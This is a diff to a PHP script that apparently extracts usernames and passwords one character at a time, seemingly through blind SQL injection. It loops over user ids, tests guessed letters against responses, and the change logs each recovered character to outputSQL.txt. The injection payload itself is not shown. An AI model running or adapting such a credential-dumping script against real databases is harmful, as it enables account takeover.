@@ -19,10 +19,12 @@
 } */
 
 
-
+$monfichier = fopen('outputSQL.txt', 'r+');
+fseek($monfichier, 0); 
 //Marche admin final
 for($id = 1; $id <= 99; $id++){
 	print "\n";
+	fputs($monfichier, "\n");
 	$size = 0;
 	while ($size < 40)
 	{
@@ -52,6 +54,7 @@ for($id = 1; $id <= 99; $id++){
 			if (strpos($result, 'cat') !== false) {
 
 				print "$letter";
+				fputs($monfichier, $letter);
 				break;
 			}else{
 
@@ -77,6 +80,7 @@ for($id = 1; $id <= 99; $id++){
 		$sizepwd++;
 	}
 	echo "\n";
+	fputs($monfichier, "\n");
 	echo 'password: ';
 //print $sizepwd;
 
@@ -90,6 +94,7 @@ for($id = 1; $id <= 99; $id++){
 			if (strpos($result, 'cat') !== false) {
 
 				print "$letter";
+				fputs($monfichier, $letter);
 				break;
 			}else{
 
@@ -159,7 +164,7 @@ if (strpos($result, 'cat') !== false) {
 	echo "\n";
 	echo "nope";
 }*/
-
+fclose($monfichier);
 echo "\n";
 
 ?>
